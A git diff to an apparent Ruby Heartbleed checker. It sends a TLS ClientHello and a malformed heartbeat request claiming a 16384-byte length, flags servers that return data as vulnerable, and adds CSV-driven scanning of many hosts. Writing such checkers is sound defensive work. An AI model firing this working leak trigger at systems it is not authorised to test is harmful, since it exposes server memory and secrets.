@@ -1,6 +1,7 @@
 # encoding: BINARY
 require 'socket'
 require 'timeout'
+require 'csv'
 
 CLIENT_HELLO = -> {
   data = <<-EOS
@@ -11,13 +12,16 @@ CLIENT_HELLO = -> {
 96 86 16 00 00 06 00 0a 00 2f
 00 35 01 00 00 05 00 0f 00 01
 01
-EOS
+  EOS
   [data.split(/\s/).join("")].pack('H*')
 }.call
 
 PAYLOAD = "\x18\x03\x01\x00\x03\x01\x40\x00" #  0x4000 = 16384 = 2^14, max value to be returned
-  
+
 SERVER_HELLO_DONE = "\x0e\x00\x00\x00"
+
+OK_PORT="Couldn't connect on port"
+UNKNOWN_CONN_REF="Connection refused"
 
 module ContentType
   ALERT = "\x15"
@@ -36,57 +40,100 @@ class TLSRecord
 
 end
 
-def read_record(sock)
-  Timeout.timeout(3) do
-    type = sock.read(1)
-    version = sock.read(2)
-    length = sock.read(2).unpack('n')[0]
-    value = length > 0 ? sock.read(length) : nil
-    TLSRecord.new(type, version, value)
+class Heartbeat
+
+  def read_record(sock)
+    Timeout.timeout(3) do
+      type = sock.read(1)
+      version = sock.read(2)
+      length = sock.read(2).unpack('n')[0]
+      value = length > 0 ? sock.read(length) : nil
+      TLSRecord.new(type, version, value)
+    end
   end
+
+  def read_until_server_hello_done(sock)
+    loop do
+      record = read_record(sock)
+      break if record.value == SERVER_HELLO_DONE
+    end
+  end
+
+  def go server, port=nil
+    raise "Usage: ruby heartbeat.rb <server>" unless server
+
+    print "\n#{server}\t"
+    
+    sock = begin
+             Timeout.timeout(3) { TCPSocket.open(server, port) }
+           rescue Timeout::Error
+             return "UNKNOWN\tCouldn't connect to #{server}:#{port}"
+           rescue Errno::ECONNREFUSED
+             return "UNKNWON\tConnection refused"
+           end
+
+    sock.write(CLIENT_HELLO)
+
+    begin
+      read_until_server_hello_done(sock)
+    rescue Timeout::Error
+      return "UNKNOWN\tCouldn't establish TLS connection."
+    end
+
+    sock.write(PAYLOAD)
+
+    begin
+      heartbeat = read_record(sock)
+
+      case heartbeat.type
+      when ContentType::HEARTBEAT
+        return "FAIL\tServer vulnerable!" if heartbeat.value
+        return "PASS\tServer sent a heartbeat response, but no data. This is OK."
+      when ContentType::ALERT
+        return "PASS\tServer sent an alert instead of a heartbeat response. This is OK."
+      else
+        return "UNKNOWN\tServer sent an unexpected ContentType: #{heartbeat.type.inspect}"
+      end   
+    rescue Timeout::Error
+      return "OK\tReceived a timeout when waiting for heartbeat response. This is OK."
+    end
+
+  end
+
 end
 
-def read_until_server_hello_done(sock)
-  loop do
-    record = read_record(sock)
-    break if record.value == SERVER_HELLO_DONE
+class Reader
+
+  def load_file file
+    raise "No file!" unless file
+    CSV.read file
+  end
+
+  def loop_contents contents, &block
+    contents.each do |stuff|
+      block.call stuff
+    end
+  end
+
+  def go file, port
+    loop_contents load_file(file) do |stuff|
+      h = Heartbeat.new
+      response = h.go stuff[1], port
+      print response
+    end
   end
 end
 
 server = ARGV[0]
 port = ARGV[1] ? ARGV[1].to_i : 443
-raise "Usage: ruby heartbeat.rb <server>" unless server
 
-sock = begin
-  Timeout.timeout(3) { TCPSocket.open(server, port) }
-rescue Timeout::Error
-  puts "Couldn't connect to #{server}:#{port}"
-  exit 1
+if server =~ /\.csv$/
+  r = Reader.new
+  r.go server, port
+else
+  h = Heartbeat.new
+  h.go server, port
 end
 
-sock.write(CLIENT_HELLO)
+puts ""
 
-begin
-  read_until_server_hello_done(sock)
-rescue Timeout::Error
-  puts "Couldn't establish TLS connection."
-  exit 1
-end
-
-sock.write(PAYLOAD)
-
-begin
-  heartbeat = read_record(sock)
-
-  case heartbeat.type
-  when ContentType::HEARTBEAT
-    raise "Server vulnerable!" if heartbeat.value
-    puts "Server sent a heartbeat response, but no data. This is OK."
-  when ContentType::ALERT
-    puts "Server sent an alert instead of a heartbeat response. This is OK."
-  else
-    raise "Server sent an unexpected ContentType: #{heartbeat.type.inspect}"
-  end   
-rescue Timeout::Error
-  puts "Received a timeout when waiting for heartbeat response. This is OK."
-end
